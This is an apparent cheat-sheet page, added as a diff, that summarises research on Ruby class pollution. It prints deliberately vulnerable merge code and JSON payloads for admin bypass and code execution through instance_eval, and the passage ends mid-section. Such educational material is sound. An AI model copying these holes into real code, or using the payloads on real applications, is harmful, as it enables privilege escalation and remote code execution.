@@ -1,0 +1,350 @@
+<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Ruby Class Pollution | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/hacking/cheetsheets/deserialization/ruby-class-pollution/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">bl0g </a> </li> <li class="nav-item active"> <a class="nav-link" href="/hacking/">h4ck1ng <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/misc/">m15c </a> </li> <li class="nav-item "> <a class="nav-link" href="/repos/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/Cheetsheets/">Cheetsheets</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">Ruby Class Pollution</h1> <p class="post-description"></p> </header> <article> <h1 id="ruby-class-pollution">Ruby Class Pollution</h1> <p>This is a summary from the post <a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></p> <h2 id="merge-on-attributes">Merge on Attributes</h2> <p>Example:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Code from https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</span>
+<span class="c1"># Comments added to exploit the merge on attributes</span>
+<span class="nb">require</span> <span class="s1">'json'</span>
+
+
+<span class="c1"># Base class for both Admin and Regular users</span>
+<span class="k">class</span> <span class="nc">Person</span>
+
+  <span class="nb">attr_accessor</span> <span class="ss">:name</span><span class="p">,</span> <span class="ss">:age</span><span class="p">,</span> <span class="ss">:details</span>
+
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">:,</span> <span class="n">age</span><span class="p">:,</span> <span class="n">details</span><span class="p">:)</span>
+    <span class="vi">@name</span> <span class="o">=</span> <span class="nb">name</span>
+    <span class="vi">@age</span> <span class="o">=</span> <span class="n">age</span>
+    <span class="vi">@details</span> <span class="o">=</span> <span class="n">details</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Method to merge additional data into the object</span>
+  <span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">additional</span><span class="p">)</span>
+    <span class="n">recursive_merge</span><span class="p">(</span><span class="nb">self</span><span class="p">,</span> <span class="n">additional</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Authorize based on the `to_s` method result</span>
+  <span class="k">def</span> <span class="nf">authorize</span>
+    <span class="k">if</span> <span class="nb">to_s</span> <span class="o">==</span> <span class="s2">"Admin"</span>
+      <span class="nb">puts</span> <span class="s2">"Access granted: </span><span class="si">#{</span><span class="vi">@name</span><span class="si">}</span><span class="s2"> is an admin."</span>
+    <span class="k">else</span>
+      <span class="nb">puts</span> <span class="s2">"Access denied: </span><span class="si">#{</span><span class="vi">@name</span><span class="si">}</span><span class="s2"> is not an admin."</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Health check that executes all protected methods using `instance_eval`</span>
+  <span class="k">def</span> <span class="nf">health_check</span>
+    <span class="nb">protected_methods</span><span class="p">().</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="nb">method</span><span class="o">|</span>
+      <span class="nb">instance_eval</span><span class="p">(</span><span class="nb">method</span><span class="p">.</span><span class="nf">to_s</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+  <span class="kp">private</span>
+
+  <span class="c1"># VULNERABLE FUNCTION that can be abused to merge attributes</span>
+  <span class="k">def</span> <span class="nf">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">additional</span><span class="p">,</span> <span class="n">current_obj</span> <span class="o">=</span> <span class="n">original</span><span class="p">)</span>
+    <span class="n">additional</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">|</span>
+
+      <span class="k">if</span> <span class="n">value</span><span class="p">.</span><span class="nf">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">current_obj</span><span class="p">.</span><span class="nf">respond_to?</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+          <span class="n">next_obj</span> <span class="o">=</span> <span class="n">current_obj</span><span class="p">.</span><span class="nf">public_send</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+          <span class="n">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">next_obj</span><span class="p">)</span>
+        <span class="k">else</span>
+          <span class="n">new_object</span> <span class="o">=</span> <span class="no">Object</span><span class="p">.</span><span class="nf">new</span>
+          <span class="n">current_obj</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s2">"@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">new_object</span><span class="p">)</span>
+          <span class="n">current_obj</span><span class="p">.</span><span class="nf">singleton_class</span><span class="p">.</span><span class="nf">attr_accessor</span> <span class="n">key</span>
+        <span class="k">end</span>
+      <span class="k">else</span>
+        <span class="n">current_obj</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s2">"@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+        <span class="n">current_obj</span><span class="p">.</span><span class="nf">singleton_class</span><span class="p">.</span><span class="nf">attr_accessor</span> <span class="n">key</span>
+      <span class="k">end</span>
+    <span class="k">end</span>
+    <span class="n">original</span>
+  <span class="k">end</span>
+
+  <span class="kp">protected</span>
+
+  <span class="k">def</span> <span class="nf">check_cpu</span>
+    <span class="nb">puts</span> <span class="s2">"CPU check passed."</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">check_memory</span>
+    <span class="nb">puts</span> <span class="s2">"Memory check passed."</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="c1"># Admin class inherits from Person</span>
+<span class="k">class</span> <span class="nc">Admin</span> <span class="o">&lt;</span> <span class="no">Person</span>
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">:,</span> <span class="n">age</span><span class="p">:,</span> <span class="n">details</span><span class="p">:)</span>
+    <span class="k">super</span><span class="p">(</span><span class="ss">name: </span><span class="nb">name</span><span class="p">,</span> <span class="ss">age: </span><span class="n">age</span><span class="p">,</span> <span class="ss">details: </span><span class="n">details</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">to_s</span>
+    <span class="s2">"Admin"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="c1"># Regular user class inherits from Person</span>
+<span class="k">class</span> <span class="nc">User</span> <span class="o">&lt;</span> <span class="no">Person</span>
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">:,</span> <span class="n">age</span><span class="p">:,</span> <span class="n">details</span><span class="p">:)</span>
+    <span class="k">super</span><span class="p">(</span><span class="ss">name: </span><span class="nb">name</span><span class="p">,</span> <span class="ss">age: </span><span class="n">age</span><span class="p">,</span> <span class="ss">details: </span><span class="n">details</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">to_s</span>
+    <span class="s2">"User"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">JSONMergerApp</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">run</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+    <span class="n">additional_object</span> <span class="o">=</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+
+    <span class="c1"># Instantiate a regular user</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span>
+      <span class="ss">name: </span><span class="s2">"John Doe"</span><span class="p">,</span>
+      <span class="ss">age: </span><span class="mi">30</span><span class="p">,</span>
+      <span class="ss">details: </span><span class="p">{</span>
+        <span class="s2">"occupation"</span> <span class="o">=&gt;</span> <span class="s2">"Engineer"</span><span class="p">,</span>
+        <span class="s2">"location"</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="s2">"city"</span> <span class="o">=&gt;</span> <span class="s2">"Madrid"</span><span class="p">,</span>
+          <span class="s2">"country"</span> <span class="o">=&gt;</span> <span class="s2">"Spain"</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">)</span>
+
+
+    <span class="c1"># Perform a recursive merge, which could override methods</span>
+    <span class="n">user</span><span class="p">.</span><span class="nf">merge_with</span><span class="p">(</span><span class="n">additional_object</span><span class="p">)</span>
+
+    <span class="c1"># Authorize the user (privilege escalation vulnerability)</span>
+    <span class="c1"># ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'</span>
+    <span class="n">user</span><span class="p">.</span><span class="nf">authorize</span>
+
+    <span class="c1"># Execute health check (RCE vulnerability)</span>
+    <span class="c1"># ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'</span>
+    <span class="n">user</span><span class="p">.</span><span class="nf">health_check</span>
+
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">if</span> <span class="no">ARGV</span><span class="p">.</span><span class="nf">length</span> <span class="o">!=</span> <span class="mi">1</span>
+  <span class="nb">puts</span> <span class="s2">"Usage: ruby class_pollution.rb 'JSON_STRING'"</span>
+  <span class="nb">exit</span>
+<span class="k">end</span>
+
+<span class="n">json_input</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="no">JSONMergerApp</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+</code></pre></div></div> <h3 id="explanation">Explanation</h3> <ol> <li><strong>Privilege Escalation</strong>: The <code class="language-plaintext highlighter-rouge">authorize</code> method checks if <code class="language-plaintext highlighter-rouge">to_s</code> returns “Admin.” By injecting a new <code class="language-plaintext highlighter-rouge">to_s</code> attribute through JSON, an attacker can make the <code class="language-plaintext highlighter-rouge">to_s</code> method return “Admin,” granting unauthorized privileges.</li> <li><strong>Remote Code Execution</strong>: In <code class="language-plaintext highlighter-rouge">health_check</code>, <code class="language-plaintext highlighter-rouge">instance_eval</code> executes methods listed in <code class="language-plaintext highlighter-rouge">protected_methods</code>. If an attacker injects custom method names (like <code class="language-plaintext highlighter-rouge">"puts 1"</code>), <code class="language-plaintext highlighter-rouge">instance_eval</code> will execute it, leading to <strong>remote code execution (RCE)</strong>. <ol> <li>This is only possible because there is a <strong>vulnerable <code class="language-plaintext highlighter-rouge">eval</code> instruction</strong> executing the string value of that attribute.</li> </ol> </li> <li><strong>Impact Limitation</strong>: This vulnerability only affects individual instances, leaving other instances of <code class="language-plaintext highlighter-rouge">User</code> and <code class="language-plaintext highlighter-rouge">Admin</code> unaffected, thus limiting the scope of exploitation.</li> </ol> <h3 id="real-world-cases-">Real-World Cases <a href="#real-world-cases" id="real-world-cases"></a></h3> <h3 id="activesupports-deep_merge">ActiveSupport’s <code class="language-plaintext highlighter-rouge">deep_merge</code></h3> <p>This isn’t vulnerable by default but can be made vulnerable with something like:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Method to merge additional data into the object using ActiveSupport deep_merge</span>
+<span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">other_object</span><span class="p">)</span>
+  <span class="n">merged_hash</span> <span class="o">=</span> <span class="n">to_h</span><span class="p">.</span><span class="nf">deep_merge</span><span class="p">(</span><span class="n">other_object</span><span class="p">)</span>
+
+  <span class="n">merged_hash</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">|</span>
+    <span class="nb">self</span><span class="p">.</span><span class="nf">class</span><span class="p">.</span><span class="nf">attr_accessor</span> <span class="n">key</span>
+    <span class="nb">instance_variable_set</span><span class="p">(</span><span class="s2">"@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="nb">self</span>
+<span class="k">end</span>
+</code></pre></div></div> <h3 id="hashies-deep_merge">Hashie’s <code class="language-plaintext highlighter-rouge">deep_merge</code></h3> <p>Hashie’s <code class="language-plaintext highlighter-rouge">deep_merge</code> method operates directly on object attributes rather than plain hashes. It <strong>prevents replacement of methods</strong> with attributes in a merge with some <strong>exceptions</strong>: attributes that end with <code class="language-plaintext highlighter-rouge">_</code>, <code class="language-plaintext highlighter-rouge">!</code>, or <code class="language-plaintext highlighter-rouge">?</code> can still be merged into the object.</p> <p>Some special case is the attribute <strong><code class="language-plaintext highlighter-rouge">_</code></strong> on its own. Just <code class="language-plaintext highlighter-rouge">_</code> is an attribute that usually returns a <code class="language-plaintext highlighter-rouge">Mash</code> object. And because it’s part of the <strong>exceptions</strong>, it’s possible to modify it.</p> <p>Check the following example how passing <code class="language-plaintext highlighter-rouge">{"_": "Admin"}</code> one is able to bypass <code class="language-plaintext highlighter-rouge">_.to_s == "Admin"</code>:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'json'</span>
+<span class="nb">require</span> <span class="s1">'hashie'</span>
+
+<span class="c1"># Base class for both Admin and Regular users</span>
+<span class="k">class</span> <span class="nc">Person</span> <span class="o">&lt;</span> <span class="no">Hashie</span><span class="o">::</span><span class="no">Mash</span>
+
+  <span class="c1"># Method to merge additional data into the object using hashie</span>
+  <span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">other_object</span><span class="p">)</span>
+    <span class="n">deep_merge!</span><span class="p">(</span><span class="n">other_object</span><span class="p">)</span>
+    <span class="nb">self</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Authorize based on to_s</span>
+  <span class="k">def</span> <span class="nf">authorize</span>
+    <span class="k">if</span> <span class="n">_</span><span class="p">.</span><span class="nf">to_s</span> <span class="o">==</span> <span class="s2">"Admin"</span>
+      <span class="nb">puts</span> <span class="s2">"Access granted: </span><span class="si">#{</span><span class="vi">@name</span><span class="si">}</span><span class="s2"> is an admin."</span>
+    <span class="k">else</span>
+      <span class="nb">puts</span> <span class="s2">"Access denied: </span><span class="si">#{</span><span class="vi">@name</span><span class="si">}</span><span class="s2"> is not an admin."</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+<span class="k">end</span>
+
+<span class="c1"># Admin class inherits from Person</span>
+<span class="k">class</span> <span class="nc">Admin</span> <span class="o">&lt;</span> <span class="no">Person</span>
+  <span class="k">def</span> <span class="nf">to_s</span>
+    <span class="s2">"Admin"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="c1"># Regular user class inherits from Person</span>
+<span class="k">class</span> <span class="nc">User</span> <span class="o">&lt;</span> <span class="no">Person</span>
+  <span class="k">def</span> <span class="nf">to_s</span>
+    <span class="s2">"User"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">JSONMergerApp</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">run</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+    <span class="n">additional_object</span> <span class="o">=</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+
+    <span class="c1"># Instantiate a regular user</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">new</span><span class="p">({</span>
+      <span class="ss">name: </span><span class="s2">"John Doe"</span><span class="p">,</span>
+      <span class="ss">age: </span><span class="mi">30</span><span class="p">,</span>
+      <span class="ss">details: </span><span class="p">{</span>
+        <span class="s2">"occupation"</span> <span class="o">=&gt;</span> <span class="s2">"Engineer"</span><span class="p">,</span>
+        <span class="s2">"location"</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="s2">"city"</span> <span class="o">=&gt;</span> <span class="s2">"Madrid"</span><span class="p">,</span>
+          <span class="s2">"country"</span> <span class="o">=&gt;</span> <span class="s2">"Spain"</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">})</span>
+
+    <span class="c1"># Perform a deep merge, which could override methods</span>
+    <span class="n">user</span><span class="p">.</span><span class="nf">merge_with</span><span class="p">(</span><span class="n">additional_object</span><span class="p">)</span>
+
+    <span class="c1"># Authorize the user (privilege escalation vulnerability)</span>
+    <span class="c1"># Exploit: If we pass {"_": "Admin"} in the JSON, the user will be treated as an admin.</span>
+    <span class="c1"># Example usage: ruby hashie.rb '{"_": "Admin", "name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'</span>
+    <span class="n">user</span><span class="p">.</span><span class="nf">authorize</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">if</span> <span class="no">ARGV</span><span class="p">.</span><span class="nf">length</span> <span class="o">!=</span> <span class="mi">1</span>
+  <span class="nb">puts</span> <span class="s2">"Usage: ruby hashie.rb 'JSON_STRING'"</span>
+  <span class="nb">exit</span>
+<span class="k">end</span>
+
+<span class="n">json_input</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="no">JSONMergerApp</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+</code></pre></div></div> <h2 id="poison-the-classes-">Poison the Classes <a href="#escaping-the-object-to-poison-the-class" id="escaping-the-object-to-poison-the-class"></a></h2> <p>In the following example it’s possible to find the class <strong><code class="language-plaintext highlighter-rouge">Person</code></strong>, and the the clases <strong><code class="language-plaintext highlighter-rouge">Admin</code></strong> and <strong><code class="language-plaintext highlighter-rouge">Regular</code></strong> which inherits from the <strong><code class="language-plaintext highlighter-rouge">Person</code></strong> class. It also has another class called <strong><code class="language-plaintext highlighter-rouge">KeySigner</code></strong>:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'json'</span>
+<span class="nb">require</span> <span class="s1">'sinatra/base'</span>
+<span class="nb">require</span> <span class="s1">'net/http'</span>
+
+<span class="c1"># Base class for both Admin and Regular users</span>
+<span class="k">class</span> <span class="nc">Person</span>
+  <span class="vc">@@url</span> <span class="o">=</span> <span class="s2">"http://default-url.com"</span>
+
+  <span class="nb">attr_accessor</span> <span class="ss">:name</span><span class="p">,</span> <span class="ss">:age</span><span class="p">,</span> <span class="ss">:details</span>
+
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">:,</span> <span class="n">age</span><span class="p">:,</span> <span class="n">details</span><span class="p">:)</span>
+    <span class="vi">@name</span> <span class="o">=</span> <span class="nb">name</span>
+    <span class="vi">@age</span> <span class="o">=</span> <span class="n">age</span>
+    <span class="vi">@details</span> <span class="o">=</span> <span class="n">details</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">url</span>
+    <span class="vc">@@url</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Method to merge additional data into the object</span>
+  <span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">additional</span><span class="p">)</span>
+    <span class="n">recursive_merge</span><span class="p">(</span><span class="nb">self</span><span class="p">,</span> <span class="n">additional</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="kp">private</span>
+
+  <span class="c1"># Recursive merge to modify instance variables</span>
+  <span class="k">def</span> <span class="nf">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">additional</span><span class="p">,</span> <span class="n">current_obj</span> <span class="o">=</span> <span class="n">original</span><span class="p">)</span>
+    <span class="n">additional</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">|</span>
+      <span class="k">if</span> <span class="n">value</span><span class="p">.</span><span class="nf">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">current_obj</span><span class="p">.</span><span class="nf">respond_to?</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+          <span class="n">next_obj</span> <span class="o">=</span> <span class="n">current_obj</span><span class="p">.</span><span class="nf">public_send</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+          <span class="n">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">next_obj</span><span class="p">)</span>
+        <span class="k">else</span>
+          <span class="n">new_object</span> <span class="o">=</span> <span class="no">Object</span><span class="p">.</span><span class="nf">new</span>
+          <span class="n">current_obj</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s2">"@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">new_object</span><span class="p">)</span>
+          <span class="n">current_obj</span><span class="p">.</span><span class="nf">singleton_class</span><span class="p">.</span><span class="nf">attr_accessor</span> <span class="n">key</span>
+        <span class="k">end</span>
+      <span class="k">else</span>
+        <span class="n">current_obj</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s2">"@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+        <span class="n">current_obj</span><span class="p">.</span><span class="nf">singleton_class</span><span class="p">.</span><span class="nf">attr_accessor</span> <span class="n">key</span>
+      <span class="k">end</span>
+    <span class="k">end</span>
+    <span class="n">original</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">User</span> <span class="o">&lt;</span> <span class="no">Person</span>
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">:,</span> <span class="n">age</span><span class="p">:,</span> <span class="n">details</span><span class="p">:)</span>
+    <span class="k">super</span><span class="p">(</span><span class="ss">name: </span><span class="nb">name</span><span class="p">,</span> <span class="ss">age: </span><span class="n">age</span><span class="p">,</span> <span class="ss">details: </span><span class="n">details</span><span class="p">)</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="c1"># A class created to simulate signing with a key, to be infected with the third gadget</span>
+<span class="k">class</span> <span class="nc">KeySigner</span>
+  <span class="vc">@@signing_key</span> <span class="o">=</span> <span class="s2">"default-signing-key"</span>
+
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">signing_key</span>
+    <span class="vc">@@signing_key</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">signing_key</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="s2">"</span><span class="si">#{</span><span class="n">data</span><span class="si">}</span><span class="s2">-signed-with-</span><span class="si">#{</span><span class="n">signing_key</span><span class="si">}</span><span class="s2">"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">JSONMergerApp</span> <span class="o">&lt;</span> <span class="no">Sinatra</span><span class="o">::</span><span class="no">Base</span>
+  <span class="c1"># POST /merge - Infects class variables using JSON input</span>
+  <span class="n">post</span> <span class="s1">'/merge'</span> <span class="k">do</span>
+    <span class="n">content_type</span> <span class="ss">:json</span>
+    <span class="n">json_input</span> <span class="o">=</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="nf">body</span><span class="p">.</span><span class="nf">read</span><span class="p">)</span>
+
+    <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span>
+      <span class="ss">name: </span><span class="s2">"John Doe"</span><span class="p">,</span>
+      <span class="ss">age: </span><span class="mi">30</span><span class="p">,</span>
+      <span class="ss">details: </span><span class="p">{</span>
+        <span class="s2">"occupation"</span> <span class="o">=&gt;</span> <span class="s2">"Engineer"</span><span class="p">,</span>
+        <span class="s2">"location"</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="s2">"city"</span> <span class="o">=&gt;</span> <span class="s2">"Madrid"</span><span class="p">,</span>
+          <span class="s2">"country"</span> <span class="o">=&gt;</span> <span class="s2">"Spain"</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">)</span>
+
+    <span class="n">user</span><span class="p">.</span><span class="nf">merge_with</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+
+    <span class="p">{</span> <span class="ss">status: </span><span class="s1">'merged'</span> <span class="p">}.</span><span class="nf">to_json</span>
+  <span class="k">end</span>
+
+  <span class="c1"># GET /launch-curl-command - Activates the first gadget</span>
+  <span class="n">get</span> <span class="s1">'/launch-curl-command'</span> <span class="k">do</span>
+    <span class="n">content_type</span> <span class="ss">:json</span>
+
+    <span class="c1"># This gadget makes an HTTP request to the URL stored in the User class</span>
+    <span class="k">if</span> <span class="no">Person</span><span class="p">.</span><span class="nf">respond_to?</span><span class="p">(</span><span class="ss">:url</span><span class="p">)</span>
+      <span class="n">url</span> <span class="o">=</span> <span class="no">Person</span><span class="p">.</span><span class="nf">url</span>
+      <span class="n">response</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+      <span class="p">{</span> <span class="ss">status: </span><span class="s1">'HTTP request made'</span><span class="p">,</span> <span class="ss">url: </span><span class="n">url</span><span class="p">,</span> <span class="ss">response_body: </span><span class="n">response</span><span class="p">.</span><span class="nf">body</span> <span class="p">}.</span><span class="nf">to_json</span>
+    <span class="k">else</span>
+      <span class="p">{</span> <span class="ss">status: </span><span class="s1">'Failed to access URL variable'</span> <span class="p">}.</span><span class="nf">to_json</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Curl command to infect User class URL:</span>
